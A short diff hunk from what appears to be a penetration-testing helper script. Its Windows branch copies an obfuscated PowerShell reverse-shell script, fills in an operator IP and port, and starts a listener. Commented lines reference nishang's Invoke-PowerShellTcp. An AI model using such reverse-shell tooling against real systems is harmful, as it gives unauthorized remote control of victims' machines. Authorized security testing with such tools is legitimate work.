@@ -55,7 +55,7 @@ case "$1" in
     "wi") #Windows
         #cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1;
         #echo -e "Invoke-PowerShellTcp -Reverse -IPAddress $ip -Port $port" >> rev.ps1;
-        cp /opt/PrviEsc/WinPrviEsc/RevShell/Invoke-PowerShellTcp-obfuscate.ps1 rev.ps1;
+        cp /opt/LateralMovement/Windows/RevShell/Invoke-PowerShellTcp-obfuscate.ps1 rev.ps1;
         sed -i "s/ChangeThisIP/$ip/;s/ChangeThisPort/$port/g" rev.ps1;
         listener win;;
     "win2") #Fully Interactive Reverse Shell
